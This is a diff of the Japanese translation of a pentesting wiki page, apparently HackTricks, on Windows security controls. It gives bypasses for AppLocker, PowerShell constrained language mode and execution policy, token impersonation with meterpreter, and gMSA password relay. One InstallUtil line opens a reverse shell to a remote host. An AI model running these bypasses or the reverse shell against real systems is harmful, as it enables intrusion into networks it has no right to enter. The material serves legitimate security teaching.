@@ -6,8 +6,8 @@
 
 アプリケーションホワイトリストは、システム上で存在し実行されることが許可された承認済みのソフトウェアアプリケーションまたは実行可能ファイルのリストです。目的は、環境を有害なマルウェアや、組織の特定のビジネスニーズに合致しない未承認のソフトウェアから保護することです。
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) は、Microsoftの**アプリケーションホワイトリストソリューション**であり、システム管理者に**ユーザーが実行できるアプリケーションとファイルを制御する**機能を提供します。これは、実行可能ファイル、スクリプト、Windowsインストーラーファイル、DLL、パッケージアプリ、およびパックされたアプリインストーラーに対して**詳細な制御**を提供します。\
-組織が**cmd.exeとPowerShell.exe**をブロックし、特定のディレクトリへの書き込みアクセスを制限することは一般的ですが、**これらはすべて回避可能です**。
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) は、マイクロソフトの**アプリケーションホワイトリストソリューション**であり、システム管理者に**ユーザーが実行できるアプリケーションやファイルを制御する**機能を提供します。これは、実行可能ファイル、スクリプト、Windowsインストーラーファイル、DLL、パッケージアプリ、およびパックされたアプリインストーラーに対して**詳細な制御**を提供します。\
+組織が**cmd.exeやPowerShell.exeをブロックし**、特定のディレクトリへの書き込みアクセスを制限することは一般的ですが、**これらはすべて回避可能です**。
 
 ### Check
 
@@ -26,7 +26,7 @@ $a.rulecollections
 
 ### バイパス
 
-- AppLockerポリシーをバイパスするための便利な**書き込み可能フォルダー**：AppLockerが`C:\Windows\System32`または`C:\Windows`内の任意の実行を許可している場合、**このバイパスに使用できる書き込み可能フォルダー**があります。
+- AppLockerポリシーをバイパスするための便利な**書き込み可能フォルダー**：AppLockerが`C:\Windows\System32`または`C:\Windows`内の任意のものを実行することを許可している場合、**このバイパスに使用できる書き込み可能フォルダー**があります。
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
@@ -35,8 +35,8 @@ C:\windows\tracing
 ```
 - 一般的に**信頼された** [**"LOLBAS's"**](https://lolbas-project.github.io/) バイナリは、AppLockerを回避するのにも役立ちます。
 - **不適切に書かれたルールも回避される可能性があります**
-- 例えば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** の場合、どこにでも**`allowed`**という**フォルダーを作成**すれば許可されます。
-- 組織はしばしば**`%System32%\WindowsPowerShell\v1.0\powershell.exe`** 実行可能ファイルを**ブロックすることに焦点を当てますが、他の** [**PowerShell実行可能ファイルの場所**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) を忘れがちです。例えば、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` や `PowerShell_ISE.exe` などです。
+- 例えば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** の場合、**`allowed`** という**フォルダーをどこにでも作成すれば**許可されます。
+- 組織はしばしば**`%System32%\WindowsPowerShell\v1.0\powershell.exe`** 実行可能ファイルの**ブロック**に焦点を当てますが、**他の** [**PowerShell実行可能ファイルの場所**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) を忘れがちです。例えば、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` や `PowerShell_ISE.exe` などです。
 - **DLLの強制は非常に稀に有効**であり、システムにかかる追加の負荷や、何も壊れないことを確認するために必要なテストの量が理由です。したがって、**DLLをバックドアとして使用することでAppLockerを回避するのに役立ちます**。
 - [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) や [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用して、**Powershell** コードを任意のプロセスで実行し、AppLockerを回避できます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode) を確認してください。
 
@@ -67,13 +67,13 @@ LSAはディスクにいくつかの資格情報を保存することがあり�
 
 これはアクティブディレクトリのデータベースです。ドメインコントローラーにのみ存在します。
 
-## ディフェンダー
+## Defender
 
 [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) は、Windows 10およびWindows 11、そしてWindows Serverのバージョンで利用可能なアンチウイルスです。**一般的なペンテストツール**（例：**`WinPEAS`**）を**ブロック**します。しかし、これらの保護を**回避する方法**があります。
 
 ### チェック
 
-**Defender**の**ステータス**を確認するには、PSコマンドレット**`Get-MpComputerStatus`**を実行できます（**`RealTimeProtectionEnabled`**の値を確認して、アクティブかどうかを知る）：
+**Defender**の**状態**を確認するには、PSコマンドレット **`Get-MpComputerStatus`** を実行できます（**`RealTimeProtectionEnabled`** の値を確認して、アクティブかどうかを知る）：
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -115,7 +115,7 @@ EFSは、**対称鍵**である**ファイル暗号化キー（FEK）**を使用
 **重要なポイント**：
 
 - EFSは、ユーザーの公開鍵で暗号化された対称FEKを使用します。
-- 復号にはユーザーの秘密鍵が使用され、FEKにアクセスします。
+- 復号には、FEKにアクセスするためにユーザーの秘密鍵が使用されます。
 - FAT32へのコピーやネットワーク送信など、特定の条件下で自動的に復号が行われます。
 - 暗号化ファイルは、追加の手順なしで所有者がアクセスできます。
 
@@ -130,7 +130,7 @@ EFSは、**対称鍵**である**ファイル暗号化キー（FEK）**を使用
 
 #### 権限のあるシステムであること
 
-この方法では、**被害者ユーザー**がホスト内で**プロセス**を**実行している**必要があります。その場合、`meterpreter`セッションを使用してユーザーのプロセスのトークンを偽装することができます（`incognito`の`impersonate_token`）。または、ユーザーのプロセスに`migrate`することもできます。
+この方法では、**被害者ユーザー**がホスト内で**プロセス**を**実行**している必要があります。その場合、`meterpreter`セッションを使用してユーザーのプロセスのトークンを偽装することができます（`incognito`の`impersonate_token`）。または、ユーザーのプロセスに`migrate`することもできます。
 
 #### ユーザーのパスワードを知っていること
 
@@ -158,7 +158,7 @@ gMSAのパスワードはLDAPプロパティ_**msDS-ManagedPassword**_に保存�
 ```
 [**この投稿で詳細情報を見つける**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
-また、**gMSA**の**パスワード**を**読み取る**ための**NTLMリレー攻撃**を実行する方法についての[ウェブページ](https://cube0x0.github.io/Relaying-for-gMSA/)を確認してください。
+また、**gMSA**の**パスワード**を**読み取る**ための**NTLMリレー攻撃**を実行する方法については、こちらの[ウェブページ](https://cube0x0.github.io/Relaying-for-gMSA/)を確認してください。
 
 ## LAPS
 
@@ -168,7 +168,7 @@ gMSAのパスワードはLDAPプロパティ_**msDS-ManagedPassword**_に保存�
 active-directory-methodology/laps.md
 {{#endref}}
 
-## PS 制約付き言語モード
+## PS制約付き言語モード
 
 PowerShell [**制約付き言語モード**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)は、COMオブジェクトのブロック、承認された.NETタイプのみの許可、XAMLベースのワークフロー、PowerShellクラスなど、PowerShellを効果的に使用するために必要な多くの機能を**制限**します。
 
@@ -193,11 +193,11 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用して、任意のプロセスで **Powershell** コードを実行し、制約モードをバイパスできます。詳細については、[こちら](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode) を確認してください。
+[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用して、**Powershell** コードを任意のプロセスで実行し、制約モードをバイパスできます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode) を確認してください。
 
 ## PS 実行ポリシー
 
-デフォルトでは **restricted** に設定されています。このポリシーをバイパスする主な方法：
+デフォルトでは、**restricted** に設定されています。このポリシーをバイパスする主な方法：
 ```bash
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -219,17 +219,17 @@ $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.T
 ```
 More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 
-## Security Support Provider Interface (SSPI)
+## セキュリティサポートプロバイダインターフェース (SSPI)
 
 ユーザーを認証するために使用できるAPIです。
 
-SSPIは、通信を希望する2台のマシンに適切なプロトコルを見つける役割を担います。これに対する推奨方法はKerberosです。次に、SSPIは使用される認証プロトコルを交渉します。これらの認証プロトコルはSecurity Support Provider (SSP)と呼ばれ、各Windowsマシン内にDLLの形で存在し、両方のマシンが同じものをサポートする必要があります。
+SSPIは、通信を希望する2台のマシンに適切なプロトコルを見つける役割を担います。これに対する推奨方法はKerberosです。次に、SSPIは使用される認証プロトコルを交渉します。これらの認証プロトコルはセキュリティサポートプロバイダ（SSP）と呼ばれ、各Windowsマシン内にDLLの形で存在し、両方のマシンが同じものをサポートする必要があります。
 
-### Main SSPs
+### 主なSSP
 
 - **Kerberos**: 推奨されるもの
 - %windir%\Windows\System32\kerberos.dll
-- **NTLMv1** および **NTLMv2**: 互換性の理由
+- **NTLMv1**および**NTLMv2**: 互換性の理由
 - %windir%\Windows\System32\msv1_0.dll
 - **Digest**: WebサーバーおよびLDAP、MD5ハッシュ形式のパスワード
 - %windir%\Windows\System32\Wdigest.dll
@@ -240,12 +240,12 @@ SSPIは、通信を希望する2台のマシンに適切なプロトコルを見
 
 #### 交渉は複数の方法を提供することもあれば、1つだけを提供することもあります。
 
-## UAC - User Account Control
+## UAC - ユーザーアカウント制御
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された活動のための同意プロンプトを有効にする**機能です。
+[ユーザーアカウント制御 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された活動のための同意プロンプト**を有効にする機能です。
 
 {{#ref}}
-windows-security-controls/uac-user-account-control.md
+authentication-credentials-uac-and-efs/uac-user-account-control.md
 {{#endref}}
 
 {{#include ../banners/hacktricks-training.md}}
